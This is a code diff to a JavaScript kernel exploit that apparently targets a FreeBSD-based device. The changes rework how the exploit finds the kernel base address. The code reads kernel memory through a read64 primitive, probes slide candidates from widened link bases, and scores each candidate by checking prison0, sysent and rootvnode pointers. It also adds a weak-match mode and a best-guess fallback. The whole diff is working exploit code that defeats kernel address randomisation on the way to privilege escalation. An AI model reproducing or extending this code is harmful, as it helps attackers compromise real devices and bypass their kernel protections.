@@ -526,7 +526,7 @@ var SURVIVE_MS = (function(){
 })();
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 
-var REVISION = "genuine-u8-rw-20-1352";
+var REVISION = "genuine-u8-rw-21-1352";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -655,10 +655,15 @@ function kernelBaseFromQuery() {
     return null;
 }
 
-var KBASE_LINK_BASES = [0xffffffff80200000n, 0xffffffff82200000n];
-var KBASE_SLIDE_STEP = 0x200000n;
-var KBASE_SLIDE_MAX  = 0x1000000n;
-var KBASE_SCAN_CHUNK = 8;
+var KBASE_LINK_BASES = [
+    0xffffffff80000000n,
+    0xffffffff80200000n,
+    0xffffffff82000000n,
+    0xffffffff82200000n
+];
+var KBASE_SLIDE_STEP = 0x100000n;
+var KBASE_SLIDE_MAX  = 0x3000000n;
+var KBASE_SCAN_CHUNK = 10;
 
 function parseHexBig(raw, fallback) {
     if (raw == null || raw === "") return fallback;
@@ -687,35 +692,55 @@ function kbaseScanConfig() {
     return { links: links, step: step, maxSlide: maxSlide, chunk: chunk };
 }
 
-function kbaseCandidateValid(base) {
+function kbaseSampleAt(base) {
+    if (!fwOffsets || fwOffsets.prison0 == null || fwOffsets.sysent == null) return null;
+    var sysent = base + BigInt(fwOffsets.sysent);
+    return {
+        base: base,
+        prison: read64(base + BigInt(fwOffsets.prison0)),
+        syRaw: read64(sysent),
+        syCall: read64(sysent + 8n),
+        root: fwOffsets.rootvnode != null
+            ? read64(base + BigInt(fwOffsets.rootvnode)) : 0n
+    };
+}
+
+function kbaseScoreSample(s) {
+    if (!s) return 0;
+    var score = 0;
+    if (kptrBig(s.prison)) score += 2;
+    if (kptrBig(s.syCall)) score += 2;
+    var syNarg = s.syRaw & 0xffn;
+    if (syNarg <= 14n) score += 1;
+    if (kptrBig(s.root)) score += 1;
+    if (kptrBig(s.syCall) && s.syCall >= s.base && s.syCall <= s.base + 0x8000000n) score += 1;
+    return score;
+}
+
+function kbaseCandidateValid(base, weak) {
     if (!fwOffsets || fwOffsets.prison0 == null || fwOffsets.sysent == null) return false;
     if (!kptrBig(base)) return false;
-    var prison0Off = BigInt(fwOffsets.prison0);
-    var sysentOff = BigInt(fwOffsets.sysent);
-    var rootOff = fwOffsets.rootvnode != null ? BigInt(fwOffsets.rootvnode) : null;
-
-    var prison = read64(base + prison0Off);
-    if (!kptrBig(prison)) return false;
-
-    var sysent = base + sysentOff;
-    var syNarg = read64(sysent) & 0xffn;
-    if (syNarg > 14n) return false;
-    var syCall = read64(sysent + 8n);
-    if (!kptrBig(syCall)) return false;
-    if (syCall < base || syCall > base + 0x3000000n) return false;
-    var syThr = read64(sysent + 0x2cn) & 0xffffffffn;
+    var s = kbaseSampleAt(base);
+    var score = kbaseScoreSample(s);
+    if (weak) return score >= 4;
+    if (score < 6) return false;
+    var syThr = read64(base + BigInt(fwOffsets.sysent) + 0x2cn) & 0xffffffffn;
     if (syThr > 0x100000n) return false;
-
-    if (rootOff != null) {
-        var root = read64(base + rootOff);
-        if (!kptrBig(root)) return false;
-    }
-
-    var jmpOff = BigInt(firmwareJmpOffset());
-    var jmpTarget = base + jmpOff;
-    if (!kptrBig(jmpTarget)) return false;
-
     return true;
+}
+
+function kbaseScanProbeSummary() {
+    var probes = [KBASE_DEFAULT].concat(KBASE_LINK_BASES);
+    var parts = [];
+    var best = null, bestScore = 0;
+    for (var i = 0; i < probes.length; i++) {
+        var s = kbaseSampleAt(probes[i]);
+        var sc = kbaseScoreSample(s);
+        parts.push(hex(probes[i]) + ":s" + sc + ":p=" + hex(s.prison) + ":c=" + hex(s.syCall));
+        if (sc > bestScore) { bestScore = sc; best = probes[i]; }
+    }
+    mark("KBASE-SCAN-PROBE", parts.join("|"));
+    if (bestScore > 0) mark("KBASE-SCAN-BEST-GUESS", hex(best) + "-score=" + bestScore);
 }
 
 function resolveKbaseAsync(done) {
@@ -738,11 +763,15 @@ function resolveKbaseAsync(done) {
 
     var cfg = kbaseScanConfig();
     var dbgMode = Q.get("dbg") === "1";
+    var weakMode = Q.get("kbweak") === "1";
     var linkIdx = 0;
     var slide = 0n;
     var tested = 0;
+    var bestBase = null;
+    var bestScore = 0;
 
-    mark("KBASE-SCAN-BEGIN", "links=" + cfg.links.length + "-step=" + hex(cfg.step));
+    mark("KBASE-SCAN-BEGIN", "links=" + cfg.links.length + "-step=" + hex(cfg.step)
+        + "-max=" + hex(cfg.maxSlide) + (weakMode ? "-weak" : ""));
 
     function tick() {
         try {
@@ -750,13 +779,19 @@ function resolveKbaseAsync(done) {
             while (batch < cfg.chunk && linkIdx < cfg.links.length) {
                 var base = cfg.links[linkIdx] + slide;
                 tested++;
-                if (kbaseCandidateValid(base)) {
-                    mark("KBASE-SCAN-HIT", hex(base) + "-tested=" + tested);
+                var sample = kbaseSampleAt(base);
+                var score = kbaseScoreSample(sample);
+                if (score > bestScore) {
+                    bestScore = score;
+                    bestBase = base;
+                }
+                if (kbaseCandidateValid(base, weakMode)) {
+                    mark("KBASE-SCAN-HIT", hex(base) + "-tested=" + tested + "-score=" + score);
                     done(base);
                     return;
                 }
                 if (dbgMode && (tested % 64 === 0)) {
-                    mark("KBASE-SCAN-PROGRESS", "t=" + tested + "-at=" + hex(base));
+                    mark("KBASE-SCAN-PROGRESS", "t=" + tested + "-at=" + hex(base) + "-score=" + score);
                 }
                 slide += cfg.step;
                 if (slide > cfg.maxSlide) {
@@ -766,13 +801,20 @@ function resolveKbaseAsync(done) {
                 batch++;
             }
             if (linkIdx >= cfg.links.length) {
-                mark("KBASE-SCAN-FAIL", "tested=" + tested);
+                mark("KBASE-SCAN-FAIL", "tested=" + tested + "-best=" + (bestBase != null ? hex(bestBase) : "none") + "-score=" + bestScore);
+                kbaseScanProbeSummary();
+                if (Q.get("kbguess") === "1" && bestBase != null && bestScore >= 4) {
+                    mark("KBASE-SCAN-GUESS-USE", hex(bestBase));
+                    done(bestBase);
+                    return;
+                }
                 done(null);
                 return;
             }
             setTimeout(tick, 0);
         } catch (error) {
             mark("KBASE-SCAN-ERR", error.message);
+            kbaseScanProbeSummary();
             done(null);
         }
     }
